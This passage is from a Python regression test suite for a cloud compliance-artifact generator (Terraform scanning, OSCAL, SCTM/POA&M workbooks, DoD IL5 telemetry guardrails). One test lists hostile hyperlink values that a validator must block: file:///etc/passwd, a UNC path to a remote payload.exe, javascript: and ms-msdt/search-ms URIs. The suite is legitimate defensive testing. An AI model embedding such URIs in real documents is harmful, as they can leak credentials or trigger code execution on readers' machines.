                mock_proc.args = cmd_args
                return unittest.mock.MagicMock(__enter__=unittest.mock.MagicMock(return_value=mock_proc))
                
            security_scanner_bridge.run_trivy_scan(self.test_dir, runner=mock_trivy_runner)
            self.assertTrue(len(mock_proc.args) > 0)
            cmd_args = mock_proc.args
            self.assertIn("--", cmd_args, "Trivy command must contain '--' before target path")
            dash_idx = cmd_args.index("--")
            target_idx = len(cmd_args) - 1
            self.assertEqual(dash_idx, target_idx - 1, "'--' must immediately precede the target path")

        # 4. Test Directory Traversal when target directory contains 'vendor-app' or '.github_repos'
        vendor_app_dir = os.path.join(self.test_dir, "vendor-app-project")
        os.makedirs(vendor_app_dir, exist_ok=True)
        sample_tf = os.path.join(vendor_app_dir, "main.tf")
        with open(sample_tf, "w", encoding="utf-8") as f:
            f.write('resource "google_storage_bucket" "b" { name = "vendor-app-bucket" }\n')

        # Subdirectory that SHOULD be excluded
        nested_vendor_dir = os.path.join(vendor_app_dir, "vendor")
        os.makedirs(nested_vendor_dir, exist_ok=True)
        excluded_tf = os.path.join(nested_vendor_dir, "ignored.tf")
        with open(excluded_tf, "w", encoding="utf-8") as f:
            f.write('resource "google_storage_bucket" "b" { name = "should-be-ignored-bucket" }\n')

        discovered = extract_system_data.deep_scan_tf_files(vendor_app_dir)
        bucket_names = [b.get("name") for b in discovered.get("storage_buckets", [])]
        self.assertIn("vendor-app-bucket", bucket_names, "Root path containing 'vendor' must NOT be skipped")
        self.assertNotIn("should-be-ignored-bucket", bucket_names, "Exact 'vendor' subfolder must be excluded")

    def test_audit_findings_and_governance_remediation(self) -> None:
        """Verifies bug fixes and governance integrity across audit findings."""
        import validate_compliance_artifacts
        import poam_rules
        import security_scanner_bridge
        import excel_hydrator
        import generate_compliance_artifacts
        import oscal_generator

        # 1. audit_excel_workbooks finally block uses xl_path and catches close() exception cleanly
        temp_ato = os.path.join(self.test_dir, "test_excel_audit_ato")
        os.makedirs(os.path.join(temp_ato, "HW_SW_Inventory"), exist_ok=True)
        fake_xl = os.path.join(temp_ato, "HW_SW_Inventory", "Hardware_Software_Inventory.xlsm")
        with open(fake_xl, "wb") as f:
            f.write(b"PK\x05\x06" + b"\x00" * 18)

        class ExplodingWorkbook:
            sheetnames = ["Template"]
            def __getitem__(self, name):
                raise ValueError("corrupt sheet")
            def close(self):
                raise OSError("simulated disk error during close")

        with unittest.mock.patch("openpyxl.load_workbook", return_value=ExplodingWorkbook()):
            results = validate_compliance_artifacts.audit_excel_workbooks(temp_ato)
            self.assertTrue(len(results) > 0)
            self.assertIn(results[0]["status"], ("FAIL", "ERROR"))

        # 2. poam_rules propagates impact_level to scanner_cfg
        inv_dod = {
            "system_information": {
                "system_abbreviation": "TESTDOD",
                "impact_level": "IL5",
                "workspace_path": self.test_dir,
            },
            "security_scanners": {"enabled": True},
        }
        with unittest.mock.patch("poam_rules.scan_and_derive_poam_items") as mock_scan:
            mock_scan.return_value = []
            poam_rules.derive_poam_findings(inv_dod, target_dir=self.test_dir, run_scanners=True)
            self.assertTrue(mock_scan.called)
            passed_cfg = mock_scan.call_args[1]["config"]
            self.assertEqual(passed_cfg.get("impact_level"), "IL5")

        # 3. DoD guardrail in scanner bridge skips live SCC
        cfg_il5 = {"query_live_cloud_telemetry": True, "impact_level": "IL5"}
        with unittest.mock.patch("security_scanner_bridge.fetch_live_scc_findings") as mock_scc:
            findings = security_scanner_bridge.scan_and_derive_poam_items(self.test_dir, config=cfg_il5)
            self.assertFalse(mock_scc.called, "DoD IL5 must NOT call commercial SCC telemetry")

        # 4. excel_hydrator.resolve_db_asset_and_os consistency with YAML generator
        asset_name, db_os = excel_hydrator.resolve_db_asset_and_os("google_sql_database_instance", "15", "postgres")
        self.assertIn("PostgreSQL", asset_name)
        self.assertIn("Debian Linux Base", db_os)

        inv_db = {
            "system_information": {"system_name": "TestSys", "system_abbreviation": "TS", "cloud_provider": "Google Cloud"},
            "infrastructure_components": {
                "databases": [{"name": "prod-db", "type": "google_sql_database_instance", "database_version": "POSTGRES_15"}],
            },
        }
        yaml_out = generate_compliance_artifacts.generate_hwsw_inventory_yaml(inv_db)
        self.assertIn("Cloud SQL PostgreSQL Instance", yaml_out)
        self.assertIn("POSTGRES_15 / Debian Linux Base", yaml_out)

        # 5. OSCAL generator does not emit fabricated .gov emails when omitted
        inv_no_email = {
            "system_information": {"system_name": "TestSys", "system_abbreviation": "TS", "cloud_provider": "Google Cloud Platform (GCP)"},
            "roles": {"authorizing_official": {"name": "Gen. Smith"}},
            "network_architecture": {},
            "infrastructure_components": {"storage_buckets": [{"name": "b1"}]},
        }
        meta = oscal_generator.build_oscal_metadata(inv_no_email, "System Security Plan")
        for party in meta["parties"]:
            if party.get("name") == "Gen. Smith":
                self.assertNotIn("email-addresses", party, "Fabricated .gov emails must not be generated")

        # 6. OSCAL generator GCP-native storage controls and transit encryption
        comps, comp_map = oscal_generator.build_oscal_components(inv_no_email)
        storage_comp = next((c for c in comps if c["type"] == "service" and "storage" in c["title"].lower()), None)
        self.assertIsNotNone(storage_comp)
        self.assertIn("Uniform Bucket-Level Access", storage_comp["description"])

        ctrl_impl = oscal_generator.build_oscal_control_implementations(inv_no_email, comp_map)
        reqs = ctrl_impl.get("implemented-requirements", [])
        sc8_req = next((r for r in reqs if r["control-id"] == "sc-8"), None)
        self.assertIsNotNone(sc8_req)
        sc8_desc = sc8_req["by-components"][0]["description"]
        self.assertIn("ALTS", sc8_desc, "GCP environment must document Google ALTS and TLS encryption")

        # 7. Objective readiness recommendations (no automated 3-year ATO claim)
        res_audit = validate_compliance_artifacts.audit_senior_compliance_quality(
            self.test_dir,
            inv_db,
            temp_ato,
            {"coverage_score_percent": 100.0, "reconciled_assets_count": 1, "total_discovered_assets": 1},
            [],
            [],
            [],
            [],
            [],
        )
        self.assertIn("Ready for", res_audit["recommendation"])
        self.assertNotIn("3-Year", res_audit["recommendation"])
        self.assertNotIn("Full", res_audit["recommendation"])

        # Provide substantive SCTM controls to verify the >= 90 score threshold
        os.makedirs(os.path.join(temp_ato, "SCTM"), exist_ok=True)
        sctm_file = os.path.join(temp_ato, "SCTM", "SCTM_Burndown_Matrix.yaml")
        atc_controls = [
            {"id": c[0], "status": "Implemented", "implementation_details": "Configured per standard baseline with comprehensive monitoring and automated alerting."}
            for c in validate_compliance_artifacts.FOURTEEN_ATC_CONTROLS
        ]
        sctm_yaml_content = "control_families:\n  - controls:\n" + "\n".join(
            f"      - id: {c['id']}\n        status: {c['status']}\n        implementation_details: {c['implementation_details']}"
            for c in atc_controls
        )
        with open(sctm_file, "w", encoding="utf-8") as f:
            f.write(sctm_yaml_content)

        res_audit_full = validate_compliance_artifacts.audit_senior_compliance_quality(
            self.test_dir,
            inv_db,
            temp_ato,
            {"coverage_score_percent": 100.0, "reconciled_assets_count": 1, "total_discovered_assets": 1},
            [],
            [],
            [],
            [],
            [],
        )
        self.assertIn("Technical Package Complete", res_audit_full["recommendation"])
        self.assertNotIn("3-Year", res_audit_full["recommendation"])

    def test_security_symlink_escape_prevention(self) -> None:
        """Verifies that symlinks escaping the target directory boundary are rejected."""
        with tempfile.TemporaryDirectory() as root_tmp:
            target_dir = Path(root_tmp) / "target_workspace"
            target_dir.mkdir()
            outside_dir = Path(root_tmp) / "outside_workspace"
            outside_dir.mkdir()

            secret_file = outside_dir / "secret.tf"
            secret_file.write_text('resource "google_compute_instance" "leaked_vm" { name = "leaked-vm" }', encoding="utf-8")

            # Create symlink escaping target_dir
            symlink_path = target_dir / "escape_link.tf"
            try:
                symlink_path.symlink_to(secret_file)
            except OSError:
                # In environments where symlink creation is restricted, skip symlink creation
                return

            # 1. file_helpers.ensure_path_within_boundary must raise PermissionError
            with self.assertRaises(PermissionError):
                file_helpers.ensure_path_within_boundary(symlink_path, target_dir)

            with self.assertRaises(PermissionError):
                file_helpers.read_text_file(symlink_path, allowed_boundary=target_dir)

            # 2. deep_scan_tf_files must skip the symlinked file and not leak the outside resource
            scanned = extract_system_data.deep_scan_tf_files(target_dir)
            vm_names = [vm["name"] for vm in scanned.get("compute_instances", [])]
            self.assertNotIn("leaked-vm", vm_names)

    def test_balanced_brace_nested_attribute_parsing(self) -> None:
        """Verifies balanced brace counting handles nested blocks, strings with braces, and escaped quotes."""
        hcl_block = """
        settings {
            tier = "db-custom-4-16384"
            ip_configuration {
                require_ssl = true
                ipv4_enabled = false
                authorized_networks {
                    name = "corp-net {not a block}"
                    value = "10.0.0.0/8"
                }
            }
            database_flags {
                name = "log_connections"
                value = "on"
            }
        }
        """
        # Top-level nested block extraction
        settings_str = extract_system_data._extract_nested_block_str(hcl_block, "settings")
        self.assertIsNotNone(settings_str)
        self.assertIn("db-custom-4-16384", settings_str)

        # Dot-notation extraction through extract_hcl_attr with balanced braces
        ssl_enabled = extract_system_data.extract_hcl_attr(hcl_block, "settings.ip_configuration.require_ssl")
        self.assertTrue(ssl_enabled)

        ipv4_enabled = extract_system_data.extract_hcl_attr(hcl_block, "settings.ip_configuration.ipv4_enabled")
        self.assertFalse(ipv4_enabled)

        # String with braces inside quotes must not break parsing
        net_name = extract_system_data.extract_hcl_attr(hcl_block, "settings.ip_configuration.authorized_networks.name")
        self.assertEqual(net_name, "corp-net {not a block}")

    def test_docx_hyperlink_scheme_validation(self) -> None:
        """Verifies docx relationship manager enforces safe URI schemes and blocks UNC / dangerous protocols."""
        rel_mgr = docx_generator.DocxRelationshipManager()

        # Safe URLs must register and receive rIds
        self.assertTrue(rel_mgr.add_hyperlink("https://cloud.google.com/security").startswith("rId"))
        self.assertTrue(rel_mgr.add_hyperlink("http://csrc.nist.gov/publications").startswith("rId"))
        self.assertTrue(rel_mgr.add_hyperlink("mailto:ciso@organization.mil").startswith("rId"))
        self.assertTrue(rel_mgr.add_hyperlink("#internal-heading-anchor").startswith("rId"))

        # Dangerous schemes and UNC paths must be rejected (returning empty string)
        self.assertEqual(rel_mgr.add_hyperlink("file:///etc/passwd"), "")
        self.assertEqual(rel_mgr.add_hyperlink("\\\\malicious-smb-server\\share\\payload.exe"), "")
        self.assertEqual(rel_mgr.add_hyperlink("//smb-server/share"), "")
        self.assertEqual(rel_mgr.add_hyperlink("javascript:alert(1)"), "")
        self.assertEqual(rel_mgr.add_hyperlink("ms-msdt:/id PCWDiagnostic"), "")
        self.assertEqual(rel_mgr.add_hyperlink("search-ms:query=cmd"), "")

    def test_high_entropy_secret_scrubbing_vault_and_hex(self) -> None:
        """Verifies scrub_sensitive_data scrubs HashiCorp Vault tokens and 32/64-character hex strings."""
        sensitive_payload = {
            "vault_legacy_token": "s.123456789012345678901234",
            "vault_service_token": "hvs.CAESILabcdef1234567890abcdef1234",
            "md5_or_32hex_secret": "4a8b2c1d9e0f3a5b7c8d9e0f1a2b3c4d",
            "sha256_or_64hex_secret": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "jwt_oidc_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6IjEifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "safe_description": "Standard compute workload running in us-central1",
        }
        scrubbed = file_helpers.scrub_sensitive_data(sensitive_payload)

        self.assertEqual(scrubbed["vault_legacy_token"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["vault_service_token"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["md5_or_32hex_secret"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["sha256_or_64hex_secret"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["jwt_oidc_token"], "[REDACTED_SENSITIVE]")
        self.assertEqual(scrubbed["safe_description"], "Standard compute workload running in us-central1")

    def test_sctm_risk_assessment_synchronization_with_poam(self) -> None:
        """Verifies SCTM Columns U through AC synchronize with live POA&M findings."""
        tpl_path = os.path.join(TEMPLATES_DIR, "sctm", "ControlInfoExport_Template.xlsm")
        self.assertTrue(os.path.exists(tpl_path), "SCTM Template must exist")

        out_path = os.path.join(self.test_dir, "SCTM_Risk_Sync_Test.xlsm")
        hydrator = excel_hydrator.SCTMHydrator(tpl_path)

        mock_finding = {
            "item_id": "POAM-001",
            "control": "AC-02",
            "severity": "High",
            "threat": "High Privilege Escalation Risk",
            "likelihood": "Moderate",
            "impact": "High",
            "residual": "Moderate",
            "weakness_description": "Unrestricted IAM service account permissions detected.",
            "milestone_desc": "Enforce Cloud Identity role separation and least privilege.",
            "impact_description": "Potential unauthorized data exfiltration.",
            "recommendations": "Implement Assured Workloads IAM boundaries.",
        }

        with unittest.mock.patch("excel_hydrator.derive_poam_findings", return_value=[mock_finding]):
            hydrator.hydrate(self.mock_inventory, out_path)

        self.assertTrue(os.path.exists(out_path))
        wb = openpyxl.load_workbook(out_path, data_only=True, keep_vba=True)
        ws = wb["Template"]

        # Find row for AC-02
        ac02_row = None
        for r in range(6, ws.max_row + 1):
            val = ws.cell(row=r, column=1).value
            if val and "AC-02" in str(val).upper():
                ac02_row = r
                break

        self.assertIsNotNone(ac02_row, "AC-02 row must exist in SCTM")
        # Column 21 = Severity (U)
        self.assertEqual(ws.cell(row=ac02_row, column=21).value, "High")
        # Column 22 = Threat (V)
        self.assertEqual(ws.cell(row=ac02_row, column=22).value, "High Privilege Escalation Risk")
        # Column 26 = Weakness Description (Z)
        self.assertIn("Unrestricted IAM", str(ws.cell(row=ac02_row, column=26).value))
        # Column 27 = Mitigations (AA)
        self.assertIn("Enforce Cloud Identity", str(ws.cell(row=ac02_row, column=27).value))

    def test_security_bridge_boundary_and_dod_telemetry_guards(self) -> None:
        """Tests SARIF boundary enforcement, Cisco STIG suppression for virtual_router,
        and DoD IL4/IL5 telemetry guardrails.
        """
        # 1. SARIF parser allowed_boundary enforcement
        with tempfile.TemporaryDirectory() as tmp_a, tempfile.TemporaryDirectory() as tmp_b:
            sarif_file = os.path.join(tmp_a, "results.sarif")
            sample_sarif = {
                "version": "2.1.0",
                "runs": [{
                    "tool": {"driver": {"name": "TestScanner"}},
                    "results": [{
                        "ruleId": "TEST_001",
                        "message": {"text": "Test vulnerability"},
                        "level": "error"
                    }]
                }]
            }
            with open(sarif_file, "w", encoding="utf-8") as f:
                json.dump(sample_sarif, f)

            # Within allowed boundary -> succeeds with finding
            res = security_scanner_bridge.parse_sarif_file(sarif_file, allowed_boundary=tmp_a)
            self.assertEqual(len(res), 1)
            self.assertEqual(res[0]["check_id"], "TEST_001")

            # Outside allowed boundary -> parse_sarif_file returns empty list gracefully
            outside_res = security_scanner_bridge.parse_sarif_file(sarif_file, allowed_boundary=tmp_b)
            self.assertEqual(outside_res, [])

            # Direct read_json_file call with boundary mismatch raises PermissionError
            with self.assertRaises((PermissionError, ValueError)):
                file_helpers.read_json_file(sarif_file, allowed_boundary=tmp_b)

        # 2. virtual_router must NOT trigger Cisco IOS-XE Router STIG
        fake_inventory = {
            "infrastructure_components": {
                "compute_instances": [
                    {"name": "generic-virtual-router", "type": "virtual_router"}
                ],
                "services_enabled": []
            },
            "network_architecture": {
                "networks": ["vpc-prod"],
                "subnets": []
            }
        }
        resolver = stig_resolver.StigResolver(target_dir=self.test_dir)
        stigs = resolver.evaluate_applicable_stigs(fake_inventory)
        slugs = [s.get("slug") for s in stigs]
        self.assertNotIn("cisco_ios_xe_router", slugs, "virtual_router must not trigger Cisco IOS-XE STIG")

        # 3. DoD IL4/IL5 continuous monitoring telemetry validation
        with tempfile.TemporaryDirectory() as ato_tmp:
            sctm_dir = os.path.join(ato_tmp, "SCTM")
            os.makedirs(sctm_dir, exist_ok=True)
            mock_sctm = {
                "control_families": [{
                    "family": "SI - System and Information Integrity",
                    "controls": [{
                        "id": "SI-4",
                        "title": "Information System Monitoring",
                        "status": "Implemented",
                        "implementation_details": "Security Command Center Premium monitors all alerts across projects.",
                        "codebase_evidence": "Security Command Center Premium findings."
                    }]
                }]
            }
            file_helpers.write_yaml_file(os.path.join(sctm_dir, "SCTM_Burndown_Matrix.yaml"), mock_sctm)

            il5_inv = {
                "system_information": {
                    "impact_level": "DoD IL5",
                    "compliance_baseline": "NIST SP 800-53 Rev. 5 (DoD IL5)"
                },
                "infrastructure_components": {},
                "network_architecture": {}
            }
            audit_res = validate_compliance_artifacts.audit_senior_compliance_quality(
                target_dir=ato_tmp,
                inventory=il5_inv,
                ato_dir=ato_tmp,
                alignment_res={},
                excel_results=[],
                docx_results=[],
                oscal_results=[],
                unresolved_tokens=[],
                config_required_vars=[]
            )
            cat2_findings = audit_res.get("cat_2_findings", [])
            tel_finding = any("CAT2-DOD-TEL-SI-4" in f.get("id", "") for f in cat2_findings)
            self.assertTrue(tel_finding, "Unaccredited commercial SCC in DoD IL5 enclave must trigger CAT2-DOD-TEL-SI-4")

    def test_allow_unaccredited_scc_in_il5_etp_validation(self) -> None:
        """Verifies that allow_unaccredited_scc_in_il5 suppresses CAT II and issues CAT III ETP finding."""
        with tempfile.TemporaryDirectory() as ato_tmp:
            sctm_dir = os.path.join(ato_tmp, "SCTM")
            os.makedirs(sctm_dir, exist_ok=True)
            mock_sctm = {
                "control_families": [{
                    "family": "SI - System and Information Integrity",
                    "controls": [{
                        "id": "SI-4",
                        "title": "Information System Monitoring",
                        "status": "Implemented",
                        "implementation_details": "Security Command Center Premium monitors all alerts across projects.",
                        "codebase_evidence": "Security Command Center Premium findings."
                    }]
                }]
            }
            file_helpers.write_yaml_file(os.path.join(sctm_dir, "SCTM_Burndown_Matrix.yaml"), mock_sctm)

            il5_inv = {
                "system_information": {
                    "impact_level": "DoD IL5",
                    "compliance_baseline": "NIST SP 800-53 Rev. 5 (DoD IL5)"
                },
                "security_operations": {
                    "scc_enabled": True,
                    "allow_unaccredited_scc_in_il5": True
                },
                "infrastructure_components": {},
                "network_architecture": {}
            }
            audit_res = validate_compliance_artifacts.audit_senior_compliance_quality(
                target_dir=ato_tmp,
                inventory=il5_inv,
                ato_dir=ato_tmp,
                alignment_res={},
                excel_results=[],
                docx_results=[],
                oscal_results=[],
                unresolved_tokens=[],
                config_required_vars=[]
            )
            cat2_findings = audit_res.get("cat_2_findings", [])
            cat3_findings = audit_res.get("cat_3_findings", [])
            tel_cat2 = any("CAT2-DOD-TEL-SI-4" in f.get("id", "") for f in cat2_findings)
            tel_cat3 = any("CAT3-DOD-TEL-SI-4-ETP" in f.get("id", "") for f in cat3_findings)
            self.assertFalse(tel_cat2, "CAT 2 finding must be suppressed when allow_unaccredited_scc_in_il5 is True")
            self.assertTrue(tel_cat3, "CAT 3 advisory ETP finding must be issued when allow_unaccredited_scc_in_il5 is True")

    def test_resolve_secops_and_external_systems_auto_detection(self) -> None:
        """Verifies auto-detection, configuration overrides, and placeholder hydration for SecOps and external systems."""
        with tempfile.TemporaryDirectory() as tmp_target:
            # 1. Config override resolution
            cfg = {
                "system_information": {
                    "impact_level": "DoD IL5",
                    "compliance_baseline": "NIST SP 800-53 Rev. 5 (DoD IL5)"
                },
                "security_operations": {
                    "scc_enabled": True,
                    "scc_tier": "Enterprise",
                    "allow_unaccredited_scc_in_il5": False,
                    "secops_enabled": True,
                    "cssp_provider": "USAF 616 OC",
                    "external_siem_type": "Chronicle GovCloud"
                },
                "external_systems": {
                    "identity_provider": "Okta Government Solutions",
                    "mfa_mechanism": "FIPS 140-2 Level 3 Hardware Token",
                    "vulnerability_scanner": "Tenable Nessus",
                    "itsm_system": "Jira Service Management",
                    "cicd_platform": "GitLab CI/CD",
                    "edr_solution": "CrowdStrike Falcon",
                    "perimeter_gateway": "Cloud Armor"
                }
            }
            file_helpers.write_yaml_file(os.path.join(tmp_target, "compliance_config.yaml"), cfg)
            sec_ops, ext_sys = extract_system_data.resolve_secops_and_external_systems(cfg, {}, tmp_target)
            self.assertTrue(sec_ops["scc_enabled"])
            self.assertEqual(sec_ops["scc_tier"], "enterprise")
            self.assertTrue(sec_ops["secops_enabled"])
            self.assertEqual(sec_ops["cssp_provider"], "USAF 616 OC")
            self.assertEqual(ext_sys["identity_provider"], "Okta Government Solutions")
            self.assertEqual(ext_sys["itsm_system"], "Jira Service Management")

            # 2. Auto-detection from Terraform scanned data
            empty_cfg = {"system_information": {"impact_level": "FedRAMP High"}}
            tf_data = {
                "services": ["securitycenter.googleapis.com", "chronicle.googleapis.com"],
                "all_resources": [{"type": "google_scc_source", "name": "custom_findings"}],
                "logging_sinks": [{"destination": "chronicle.googleapis.com/projects/p1/locations/us/instances/i1"}]
            }
            auto_sec, auto_ext = extract_system_data.resolve_secops_and_external_systems(empty_cfg, tf_data, tmp_target)
            self.assertTrue(auto_sec["scc_enabled"])
            self.assertTrue(auto_sec["secops_enabled"])

            # 3. Dynamic macro hydration in populate_placeholders
            inv = {
                "system_information": {"system_name": "Defense App", "system_abbreviation": "DA"},
                "organization_details": {"organization_name": "DoD USMC"},
                "security_operations": {
                    "scc_enabled": True,
                    "scc_tier": "Premium",
                    "secops_enabled": False,
                    "cssp_provider": "MCCOG",
                    "external_siem_type": "Splunk Enterprise Security"
                },
                "external_systems": {
                    "identity_provider": "Microsoft Entra ID",
                    "mfa_mechanism": "DoD CAC/PIV",
                    "vulnerability_scanner": "DoD ACAS / Tenable",
                    "itsm_system": "ServiceNow ITSM",
                    "cicd_platform": "GitLab Ultimate",
                    "edr_solution": "CrowdStrike Falcon GovCloud",
                    "perimeter_gateway": "Google Cloud Armor"
                }
            }
            sample_text = (
                "SCC Status: {{ SCC_STATUS }} | Tier: {{ SCC_TIER }}\n"
                "SecOps: {{ SECOPS_STATUS }} | CSSP: {{ CSSP_PROVIDER }}\n"
                "SIEM Tool: {{ SIEM_TOOL }} | Telemetry: {{ TELEMETRY_PIPELINE }}\n"
                "Threat Engine: {{ THREAT_DETECTION_ENGINE }}\n"
                "IdP: {{ IDENTITY_PROVIDER }} | MFA: {{ MFA_MECHANISM }}\n"
                "Scanner: {{ VULNERABILITY_SCANNER }} | ITSM: {{ ITSM_SYSTEM }}\n"
                "CI/CD: {{ CICD_PLATFORM }} | EDR: {{ EDR_SOLUTION }}\n"
                "Perimeter: {{ PERIMETER_GATEWAY }}"
            )
            hydrated = generate_compliance_artifacts.populate_placeholders(sample_text, inv, "1.0.0")
            self.assertIn("Security Command Center Premium", hydrated)
            self.assertIn("Tier: Premium", hydrated)
            self.assertIn("CSSP: MCCOG", hydrated)
            self.assertIn("Splunk Enterprise Security", hydrated)
            self.assertIn("Microsoft Entra ID", hydrated)
            self.assertIn("DoD CAC/PIV", hydrated)
            self.assertIn("DoD ACAS / Tenable", hydrated)
            self.assertIn("ServiceNow ITSM", hydrated)
            self.assertIn("GitLab Ultimate", hydrated)
            self.assertIn("CrowdStrike Falcon GovCloud", hydrated)
            self.assertIn("Google Cloud Armor", hydrated)

    def test_evaluate_template_conditionals_and_macro_cleanliness(self) -> None:
        """Verifies template conditional evaluation and ensures generated policy documents contain no cafeteria phrasing."""
        # 1. HTML comments conditional syntax
        text_html = (
            "Header\n"
            "<!-- IF SCC_ENABLED -->\n"
            "SCC is strictly enabled.\n"
            "<!-- ENDIF -->\n"
            "<!-- IF NOT SCC_ENABLED -->\n"
            "SCC is disabled.\n"
            "<!-- ENDIF -->\n"
            "<!-- IF DOD_ENCLAVE -->\n"
            "DoD Enclave Active.\n"
            "<!-- ENDIF -->\n"
            "Footer"
        )
        flags_true = {"SCC_ENABLED": True, "DOD_ENCLAVE": False}
        res_true = generate_compliance_artifacts.evaluate_template_conditionals(text_html, flags_true)
        self.assertIn("SCC is strictly enabled.", res_true)
        self.assertNotIn("SCC is disabled.", res_true)
        self.assertNotIn("DoD Enclave Active.", res_true)

        flags_false = {"SCC_ENABLED": False, "DOD_ENCLAVE": True}
        res_false = generate_compliance_artifacts.evaluate_template_conditionals(text_html, flags_false)
        self.assertNotIn("SCC is strictly enabled.", res_false)
        self.assertIn("SCC is disabled.", res_false)
        self.assertIn("DoD Enclave Active.", res_false)

        # 2. Mustache conditional syntax
        text_mustache = (
            "Start\n"
            "{{#IF SECOPS_ENABLED}}\n"
            "SecOps hot indexing enabled.\n"
            "{{/IF}}\n"
            "{{#IF_NOT SECOPS_ENABLED}}\n"
            "External SIEM export enabled.\n"
            "{{/IF_NOT}}\n"
            "End"
        )
        res_secops_on = generate_compliance_artifacts.evaluate_template_conditionals(text_mustache, {"SECOPS_ENABLED": True})
        self.assertIn("SecOps hot indexing enabled.", res_secops_on)
        self.assertNotIn("External SIEM export enabled.", res_secops_on)

        res_secops_off = generate_compliance_artifacts.evaluate_template_conditionals(text_mustache, {"SECOPS_ENABLED": False})
        self.assertNotIn("SecOps hot indexing enabled.", res_secops_off)
        self.assertIn("External SIEM export enabled.", res_secops_off)

        # 3. Test dynamic narrative builders
        inv_dod = copy.deepcopy(self.mock_inventory)
        inv_dod["system_information"].update({
            "organization": "DoD Navy",
            "system_name": "Fleet Ops Enclave",
            "impact_level": "IL5",
            "compliance_baseline": "DoD IL5",
        })
        inv_dod["security_operations"] = {
            "scc_enabled": True,
            "scc_tier": "Enterprise",
            "secops_enabled": True,
            "secops_instance_name": "usn-secops",
            "cssp_provider": "USN CSOC",
            "external_siem_type": "Chronicle GovCloud",
            "allow_unaccredited_scc_in_il5": False,
        }
        inv_dod["external_systems"] = {
            "identity_provider": "Microsoft Entra ID (DoD CAC)",
            "mfa_mechanism": "DoD Common Access Card (CAC)",
            "vulnerability_scanner": "DoD ACAS (Tenable)",
            "itsm_system": "ServiceNow ITSM",
            "cicd_platform": "GitLab Ultimate (FedRAMP)",
        }
        threat_narrative = generate_compliance_artifacts.build_threat_detection_implementation_narrative(inv_dod)
        self.assertIn("DoD Navy", threat_narrative)
        self.assertIn("Security Command Center (Enterprise)", threat_narrative)
        self.assertIn("USN CSOC", threat_narrative)

        audit_narrative = generate_compliance_artifacts.build_audit_and_siem_implementation_narrative(inv_dod)
        self.assertIn("Unified Data Model (UDM)", audit_narrative)
        self.assertIn("Object Retention (Bucket Lock) in WORM", audit_narrative)

        ir_narrative = generate_compliance_artifacts.build_incident_escalation_implementation_narrative(inv_dod)
        self.assertIn("CJCSM 6510.01B", ir_narrative)
        self.assertIn("Category 1 (Root-Level Compromise / Data Exfiltration)", ir_narrative)
        self.assertIn("within **1 hour**", ir_narrative)

        vuln_narrative = generate_compliance_artifacts.build_vulnerability_management_implementation_narrative(inv_dod)
        self.assertIn("IAVA Directives / Critical Severity", vuln_narrative)
        self.assertIn("15 calendar days", vuln_narrative)
        self.assertIn("Binary Authorization", vuln_narrative)

        iam_narrative = generate_compliance_artifacts.build_identity_and_access_implementation_narrative(inv_dod)
        self.assertIn("DoD Common Access Card (CAC)", iam_narrative)
        self.assertIn("Privileged Access Manager (PAM)", iam_narrative)
        self.assertIn("maximum lease duration of 4 hours", iam_narrative)

        # 4. Verify that generated policy files contain ZERO conditional phrasing
        with tempfile.TemporaryDirectory() as target_dir:
            inv_path = os.path.join(target_dir, "system_inventory.json")
            with open(inv_path, "w", encoding="utf-8") as f:
                json.dump(inv_dod, f)
            generate_compliance_artifacts.generate_ato_artifacts(
                target_dir,
                policy_format="markdown",
                data_format="yaml",
                oscal_format="none",
            )
            pol_dir = os.path.join(target_dir, "ato_artifacts", "Policies_and_Procedures")
            banned_phrases = [
                "for organizations leveraging",
                "may elect to",
                "customers should",
                "customer should",
                "if you have",
                "recommends partners and customers",
                "Google believes",
                "Google recommends",
                "example.com",
            ]
            for pol_file in os.listdir(pol_dir):
                if pol_file.endswith(".md"):
                    content = Path(os.path.join(pol_dir, pol_file)).read_text(encoding="utf-8")
                    for phrase in banned_phrases:
                        self.assertNotIn(
                            phrase.lower(),
                            content.lower(),
                            f"Banned conditional phrase '{phrase}' found in generated policy: {pol_file}"
                        )



if __name__ == "__main__":
    # Guard: prevent accidental execution with a target folder argument
    if (
        len(sys.argv) > 1
        and not sys.argv[1].startswith("-")
        and not sys.argv[1].startswith("Test")
        and not sys.argv[1].startswith("test_")
        and not sys.argv[1].endswith(".py")
    ):
        print(
            f"\nERROR: 'test_compliance_engine.py' is an internal regression test suite for core engine developers,\n"
            f"NOT an operational compliance script for target workspace '{sys.argv[1]}'.\n\n"
            f"To provision or validate compliance artifacts for '{sys.argv[1]}', execute:\n"
            f"  1. python3 .gemini/skills/compliance/scripts/extract_system_data.py {sys.argv[1]}\n"
            f"  2. python3 .gemini/skills/compliance/scripts/generate_compliance_artifacts.py {sys.argv[1]}\n"
            f"  3. python3 .gemini/skills/compliance/scripts/validate_compliance_artifacts.py {sys.argv[1]} --fix\n",
            file=sys.stderr,
        )
    # Delegate to the unified test runner to execute the complete modular test suite
    try:
        import run_tests
        sys.exit(run_tests.main())
    except ImportError:
        unittest.main()

